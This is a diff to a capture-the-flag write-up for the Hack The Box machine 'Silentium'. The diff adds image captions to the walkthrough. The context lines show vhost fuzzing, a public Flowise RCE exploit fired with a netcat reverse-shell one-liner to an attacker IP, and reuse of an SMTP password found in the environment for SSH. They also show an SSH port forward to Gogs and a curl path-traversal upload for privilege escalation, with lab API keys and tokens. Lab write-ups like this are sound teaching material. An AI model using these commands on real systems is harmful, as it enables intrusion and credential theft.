@@ -35,6 +35,7 @@ PORT   STATE SERVICE VERSION
      -H "Host: FUZZ.silentium.htb -fs 178"`
         - Okay, this seems interesting:
         - ![image](./img-03.png)
+          <span class="caption">Virtual-host fuzzing with `-fs 178` (hiding the default 178-byte reply) leaves a single hit: `staging`, a 3,142-byte page.</span>
 - Let's add this to `/etc/hosts` and visit
     - ![image](./img-04.png)
     - We are greeted with a login portal, and we see that the host leaks that it is powered by `Flowise`(which is somekind of AI agent platform) -> might wanna check this version and see if there is a CVE exposed
@@ -61,6 +62,7 @@ PORT   STATE SERVICE VERSION
 - I am now in as Ben, so we can use the CVE we found earlier now!
 - We have our bearer token 
     - ![image](./img-13.png)
+      <span class="caption">Burp shows the logged-in request to `/user-profile` carrying a `token` JWT, a `refreshToken` and a session cookie. This `token` is what I first tried as the bearer value.</span>
 - Let's use the script! 
     - `git clone https://github.com/corey-farley/CVE-2025-59528-Flowise-RCE`
     - `python CVE-2025-59528.py -t "http://staging.silentium.htb/" -k 'hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc' -cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.159 4444 >/tmp/f'`
@@ -68,6 +70,7 @@ PORT   STATE SERVICE VERSION
     - We can see from trial and error I was trying to understand what the "bearer token" is, because normally it is the token that authenticates the admin right, so i grabbed that, but it seems like the token is actually the api key so yeah, we landed a shell!
 - Upgrade first:
 - ![image](./img-15.png)
+  <span class="caption">Inside the Flowise container, `env` dumps its configuration, including `SENDER_EMAIL=ben@silentium.htb` and an `SMTP_PASSWORD`, which turns out to be ben's SSH password.</span>
 - i Have some interesting files in root but i don't quite get what I can do with them, however i found out that doing `env` spits out so many info! And there is a password, maybe we try that on ben in ssh
     - ![image](./img-16.png)
 - Welp it seems like my intuition is right!
@@ -87,11 +90,13 @@ PORT   STATE SERVICE VERSION
 - So gogs is something like gitea, lets check which port it serves on
 - ![image](./img-19.png)
 - ![image](./img-20.png)
+  <span class="caption">The HTML served on that port links back to gogs.io, confirming the root-owned service is a Gogs instance.</span>
 
 - So port 3001 serves it. Let's port forward to our local machine
     - `ssh -L 3001:localhost:3001 ben@silentium.htb`
 - Visiting localhost:3001 gives
     - ![image](./img-21.png)
+      <span class="caption">After `ssh -L 3001:localhost:3001`, Gogs loads in my own browser at `localhost:3001`, a stock install with Register and Sign In open.</span>
 - We can kinda cheat to get the version of gogs, and try to find a CVE?
 - ![image](./img-22.png)
 - We do find some, theres like a lot of ways to priv esc, let's use this path traversal file upload https://github.com/advisories/GHSA-qf5v-rp47-55gg
@@ -103,8 +108,8 @@ PORT   STATE SERVICE VERSION
 4. push this over to gogs
 5. generate a pat (d6cedddf77fca2598f18312019fb3252b7ccad9e)
 6. generate a ssh pub key locally
-    6.1 `ssh-keygen -t ed25519 -f sig`
-    6.2 `cat sig.pub | base64 -w0`
+    - 6.1 `ssh-keygen -t ed25519 -f sig`
+    - 6.2 `cat sig.pub | base64 -w0`
 7. run this (we have .../pwn and not the long path traversal cause we linked it already)
 ```bash
 curl -v --path-as-is -X PUT --url "http://localhost:3001/api/v1/repos/sigma/repo/contents/pwn" \
